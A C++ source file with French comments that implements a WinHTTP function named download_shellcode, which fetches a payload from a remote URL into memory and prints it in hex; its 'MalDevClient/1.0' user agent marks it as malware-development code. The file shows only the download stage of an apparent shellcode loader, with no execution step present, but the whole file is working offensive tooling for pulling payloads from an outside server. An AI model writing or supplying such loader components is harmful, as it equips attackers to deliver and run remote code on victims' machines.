#include "http_client.h"
#include <winhttp.h>
#include <iostream>
#include <string>

#pragma comment(lib, "winhttp.lib")

// Fonction pour convertir une chaîne UTF-8 en wstring (Unicode)
std::wstring utf8_to_wstring(const std::string& str) {
    if (str.empty()) return std::wstring();

    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
    if (sizeNeeded == 0) return std::wstring();

    std::wstring wstr(sizeNeeded, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], sizeNeeded);
    return wstr;
}

// Fonction pour télécharger un shellcode à partir d'un serveur HTTP
bool download_shellcode(const char* url, char** shellcode, size_t* size) {
    HINTERNET hSession = nullptr, hConnect = nullptr, hRequest = nullptr;
    bool success = false;

    do {
        // Étape 1 : Ouvrir une session HTTP
        hSession = WinHttpOpen(L"MalDevClient/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
        if (!hSession) {
            std::cerr << "WinHttpOpen failed. Error: " << GetLastError() << std::endl;
            break;
        }

        // Étape 2 : Analyser l'URL
        URL_COMPONENTS urlComp = { 0 };
        wchar_t host[256] = { 0 }, path[256] = { 0 };
        urlComp.dwStructSize = sizeof(urlComp);
        urlComp.lpszHostName = host;
        urlComp.dwHostNameLength = ARRAYSIZE(host);
        urlComp.lpszUrlPath = path;
        urlComp.dwUrlPathLength = ARRAYSIZE(path);

        if (!WinHttpCrackUrl(utf8_to_wstring(url).c_str(), 0, 0, &urlComp)) {
            std::cerr << "WinHttpCrackUrl failed. Error: " << GetLastError() << std::endl;
            break;
        }

        // Étape 3 : Établir une connexion au serveur
        hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
        if (!hConnect) {
            std::cerr << "WinHttpConnect failed. Error: " << GetLastError() << std::endl;
            break;
        }

        // Étape 4 : Envoyer une requête GET
        hRequest = WinHttpOpenRequest(hConnect, L"GET", path, nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            (urlComp.nPort == INTERNET_DEFAULT_HTTPS_PORT ? WINHTTP_FLAG_SECURE : 0));
        if (!hRequest) {
            std::cerr << "WinHttpOpenRequest failed. Error: " << GetLastError() << std::endl;
            break;
        }

        if (!WinHttpSendRequest(hRequest, nullptr, 0, nullptr, 0, 0, 0)) {
            std::cerr << "WinHttpSendRequest failed. Error: " << GetLastError() << std::endl;
            break;
        }

        if (!WinHttpReceiveResponse(hRequest, nullptr)) {
            std::cerr << "WinHttpReceiveResponse failed. Error: " << GetLastError() << std::endl;
            break;
        }

        // Étape 5 : Lire les données disponibles
        DWORD bytesAvailable = 0, bytesRead = 0, totalBytesRead = 0;
        std::string buffer;

        do {
            if (!WinHttpQueryDataAvailable(hRequest, &bytesAvailable)) {
                std::cerr << "WinHttpQueryDataAvailable failed. Error: " << GetLastError() << std::endl;
                break;
            }

            if (bytesAvailable == 0) break;

            char* tempBuffer = new char[bytesAvailable];
            if (!WinHttpReadData(hRequest, tempBuffer, bytesAvailable, &bytesRead)) {
                std::cerr << "WinHttpReadData failed. Error: " << GetLastError() << std::endl;
                delete[] tempBuffer;
                break;
            }

            buffer.append(tempBuffer, bytesRead);
            totalBytesRead += bytesRead;
            delete[] tempBuffer;

        } while (bytesAvailable > 0);

        // Allouer et copier les données dans le shellcode
        *shellcode = new char[totalBytesRead];
        for (size_t i = 0; i < totalBytesRead; ++i) {
            (*shellcode)[i] = buffer[i]; // Copy each byte individually
        }
        *size = totalBytesRead;

        // Afficher le shellcode téléchargé (en hexadécimal)
        std::cout << "Shellcode téléchargé (en hexadécimal) :\n";
        for (size_t i = 0; i < totalBytesRead; ++i) {
            printf("%02X ", (unsigned char)(*shellcode)[i]);
            if ((i + 1) % 16 == 0) { // Affiche 16 octets par ligne
                printf("\n");
            }
        }
        printf("\n");

        success = true;

    } while (0);

    // Nettoyage
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return success;
}
